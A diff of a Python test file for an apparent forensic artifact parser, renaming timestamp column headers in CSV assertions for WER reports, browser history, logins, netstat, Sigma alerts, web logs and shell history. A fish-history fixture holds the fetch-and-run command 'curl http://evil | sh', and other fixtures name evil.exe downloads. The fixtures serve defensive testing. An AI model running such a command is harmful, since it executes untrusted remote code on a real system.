@@ -1006,7 +1006,7 @@ def test_handler_wer(tmp_path):
     win_wer.run(_ctx(tmp_path, out))
     text = (out / "art_wer.csv").read_text(encoding="utf-8")
     # FILETIME's epoch is 1601 UTC, so the rendered value is UTC -> `_utc` header
-    assert text.splitlines()[0].startswith("report,event_type,event_time_utc,")
+    assert text.splitlines()[0].startswith("report,event_type,timestamp_utc,")
     assert "APPCRASH" in text
     assert "C:\\Windows\\System32\\evil.exe" in text
     assert "ntdll.dll" in text
@@ -1155,7 +1155,7 @@ def test_handler_browser_chromium(tmp_path):
     assert "alice,Chrome,Default,http://evil.test,Evil Site,3,2024-01-17 21:20:00" in hist
     dl = (out / "art_browser_downloads.csv").read_text(encoding="utf-8")
     assert dl.splitlines()[0] == \
-        "user,browser,profile,target_path,source_url,bytes,start_time_utc,end_time_utc"
+        "user,browser,profile,target_path,source_url,bytes,start_utc,end_utc"
     assert "evil.exe" in dl and "http://evil.test/evil.exe" in dl
     assert "2024-01-17 21:20:00,2024-01-17 21:20:00" in dl    # UTC, not UTC+2
 
@@ -1255,7 +1255,7 @@ def test_handler_logins_text_rows_get_utc_from_the_zone_and_the_weekday(tmp_path
     def utc():
         lin_logins.run(_ctx(tmp_path, out))
         with open(out / "art_logins.csv", encoding="utf-8", newline="") as fh:
-            return [(r["source"], r["user"], r["time_utc"]) for r in csv.DictReader(fh)]
+            return [(r["source"], r["user"], r["timestamp_utc"]) for r in csv.DictReader(fh)]
 
     # no zone: the yearless text stays local only; lastlog carries its own offset
     assert utc() == [("last", "root", ""), ("last", "jdoe", ""),
@@ -1326,7 +1326,7 @@ def test_handler_process_network_netstat_without_ss_and_ps_lstart(tmp_path):
         rows = list(csv.DictReader(fh))
     by = {(r["pid"], r["proto"]): r for r in rows}
     db = by[("1557", "tcp")]
-    assert (db["user"], db["started_local"], db["cmdline"], db["state"], db["local_port"],
+    assert (db["user"], db["start_local"], db["cmdline"], db["state"], db["local_port"],
             db["source"]) == ("mysql", "Fri May 22 15:21:00 2026",
                               "/usr/sbin/mariadbd --basedir=/usr", "LISTEN", "3306", "uac/netstat")
     assert by[("", "udp")]["local_port"] == "68"            # a socket with no owner is kept
@@ -1800,7 +1800,7 @@ def test_sigma_repeats_of_one_match_are_one_row_with_count_and_span(tmp_path, mo
     lin_sigma.run(_ctx(tmp_path, out))
     with open(out / "alert_log_sigma.csv", encoding="utf-8", newline="") as fh:
         rows = list(csv.DictReader(fh))
-    assert [(r["timestamp"], r["last_timestamp"], r["count"], r["match"]) for r in rows] == [
+    assert [(r["first_seen"], r["last_seen"], r["count"], r["match"]) for r in rows] == [
         ("Nov 14 22:00:00", "Nov 14 22:10:00", "3",
          "Nov 14 22:00:00 HOST-01 crontab[101]: (root) REPLACE (root)"),
         ("Nov 14 22:07:00", "Nov 14 22:07:00", "1",
@@ -2480,7 +2480,7 @@ def test_handler_web_access_parses_apache_nginx_and_gz(tmp_path):
     assert r.status == "ok"
     out = (tmp_path / "CSVs" / "art_web_access.csv").read_text(encoding="utf-8")
     lines = out.splitlines()
-    assert lines[0].startswith("time,ip,edge_ip,method,status")
+    assert lines[0].startswith("timestamp,ip,edge_ip,method,status")
     assert len(lines) == 1 + 4                       # 4 access lines across 3 files
     assert "2026-05-19 09:11:17 +0000,10.0.0.150,,GET,200" in out  # ISO time; no proxy -> empty edge_ip
     assert "8.8.8.8,,GET,200" in out                 # nginx vhost picked up
@@ -5668,7 +5668,7 @@ def test_fish_history_is_read_with_its_times(tmp_path):
     lin_bash.run(_ctx(tmp_path, out))
     import csv
     with open(out / "art_shell_history.csv", encoding="utf-8", newline="") as fh:
-        rows = [(r["user"], r["shell"], r["time_utc"], r["command"]) for r in csv.DictReader(fh)]
+        rows = [(r["user"], r["shell"], r["timestamp_utc"], r["command"]) for r in csv.DictReader(fh)]
     assert rows == [("bob", "fish", "2023-11-14 22:13:20", "curl http://evil | sh"),
                     ("bob", "fish", "", "echo a\nb \\ c"),
                     ("bob", "fish", "2023-11-14 22:14:20", "whoami")]
